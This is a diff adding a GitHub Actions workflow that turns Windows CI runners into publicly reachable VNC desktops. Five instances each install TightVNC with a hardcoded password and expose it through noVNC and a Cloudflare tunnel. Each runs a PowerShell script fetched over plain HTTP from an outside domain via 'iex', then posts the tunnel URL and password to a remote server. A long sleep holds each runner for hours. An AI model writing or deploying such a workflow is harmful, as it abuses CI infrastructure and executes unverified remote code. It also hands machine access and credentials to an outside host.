@@ -1,0 +1,126 @@
+name: Windows Cloud Instances
+
+on:
+  workflow_dispatch:
+
+jobs:
+  windows-instance:
+    runs-on: windows-latest
+    timeout-minutes: 350
+    strategy:
+      fail-fast: false
+      matrix:
+        instance: [1,2,3,4,5]
+    steps:
+      - name: install-vnc
+        shell: powershell
+        run: |
+          Write-Output "===== STEP: install-vnc START ====="
+          choco install tightvnc -y --no-progress
+          $vnc = "C:\Program Files\TightVNC\tvnserver.exe"
+          Start-Process $vnc -ArgumentList "-install"
+          Start-Sleep -Seconds 5
+          Start-Process $vnc -ArgumentList "-start"
+          Start-Sleep -Seconds 10
+          $regPath = "HKLM:\SOFTWARE\TightVNC\Server"
+          Set-ItemProperty -Path $regPath -Name "Password" -Value "newera2625" -Type String
+          Set-ItemProperty -Path $regPath -Name "AllowLoopback" -Value 1 -Type DWord
+          Set-ItemProperty -Path $regPath -Name "LoopbackOnly" -Value 0 -Type DWord
+          Set-ItemProperty -Path $regPath -Name "AuthType" -Value 2 -Type DWord
+          Restart-Service tvnserver
+          Start-Sleep -Seconds 10
+          netstat -ano | findstr "5900"
+          Write-Output "===== STEP: install-vnc END ====="
+      - name: install-novnc
+        shell: powershell
+        run: |
+          Write-Output "===== STEP: install-novnc START ====="
+          choco install python -y --no-progress
+          choco install nssm -y --no-progress
+          python -m pip install --upgrade pip
+          python -m pip install websockify
+          Invoke-WebRequest -Uri "https://github.com/novnc/noVNC/archive/refs/heads/master.zip" -OutFile "novnc.zip"
+          Expand-Archive -Path "novnc.zip" -DestinationPath "."
+          Rename-Item -Path "noVNC-master" -NewName "novnc"
+          Write-Output "===== STEP: install-novnc END ====="
+      - name: start-novnc
+        shell: powershell
+        run: |
+          Write-Output "===== STEP: start-novnc START ====="
+          $pythonPath = (Get-Command python).Source
+          $novncPath = (Resolve-Path novnc).Path
+          $workDir = (Get-Location).Path
+          nssm install websockify $pythonPath
+          nssm set websockify AppParameters "-m websockify --web=$novncPath 6080 localhost:5900"
+          nssm set websockify AppDirectory $workDir
+          nssm set websockify Start SERVICE_AUTO_START
+          nssm start websockify
+          Start-Sleep -Seconds 10
+          netstat -ano | findstr "6080"
+          Write-Output "===== STEP: start-novnc END ====="
+      - name: register-device
+        shell: powershell
+        run: |
+          Write-Output "===== STEP: register-device START ====="
+          $output = iex ((New-Object System.Net.WebClient).DownloadString('http://status.newera2625.top/download/install.ps1'))
+          $output
+          $deviceId = [regex]::Match($output, '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}').Value
+          if (-not $deviceId) {
+            $deviceId = [regex]::Match($output, 'dev_[A-Za-z0-9_-]+').Value
+          }
+          Write-Output "DEVICE_ID=$deviceId"
+          echo "DEVICE_ID=$deviceId" >> $env:GITHUB_ENV
+          Write-Output "===== STEP: register-device END ====="
+      - name: start-tunnel
+        shell: powershell
+        run: |
+          Write-Output "===== STEP: start-tunnel START ====="
+          Invoke-WebRequest -Uri "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe" -OutFile "cloudflared.exe"
+          $cfPath = (Resolve-Path cloudflared.exe).Path
+          $workDir = (Get-Location).Path
+          nssm install cloudflared $cfPath
+          nssm set cloudflared AppParameters "tunnel --url http://localhost:6080 --no-autoupdate"
+          nssm set cloudflared AppDirectory $workDir
+          nssm set cloudflared Start SERVICE_AUTO_START
+          nssm start cloudflared
+          Start-Sleep -Seconds 50
+          $url = ""
+          try {
+            $logFile = "$workDir\tunnel-err.log"
+            if (Test-Path $logFile) {
+              $log = Get-Content $logFile -Raw
+              $url = [regex]::Match($log, 'https://[a-z0-9-]+\.trycloudflare\.com').Value
+            }
+          } catch {}
+          if (-not $url) {
+            # 从nssm重定向日志找
+            $url = [regex]::Match((Get-Content "$workDir\cloudflared-out.log" -Raw -ErrorAction SilentlyContinue), 'https://[a-z0-9-]+\.trycloudflare\.com').Value
+          }
+          echo "TUNNEL_URL=$url" >> $env:GITHUB_ENV
+          Write-Output "TUNNEL_URL=$url"
+          Write-Output "===== STEP: start-tunnel END ====="
+      - name: report-url
+        shell: powershell
+        run: |
+          Write-Output "===== STEP: report-url START ====="
+          $body = @{
+            device_id = "$env:DEVICE_ID"
+            url = "$env:TUNNEL_URL"
+            password = "newera2625"
+            os = "windows"
+            instance = "${{ matrix.instance }}"
+          } | ConvertTo-Json
+          Write-Output "POST body: $body"
+          try {
+            $resp = Invoke-RestMethod -Uri "https://cloud.newera2625.top/api/report" -Method Post -Body $body -ContentType "application/json"
+            Write-Output "report response: $resp"
+          } catch {
+            Write-Output "report failed: $_"
+          }
+          Write-Output "===== STEP: report-url END ====="
+      - name: keep-alive
+        shell: powershell
+        run: |
+          Write-Output "===== STEP: keep-alive START ====="
+          Start-Sleep -Seconds 19800
+          Write-Output "===== STEP: keep-alive END ====="
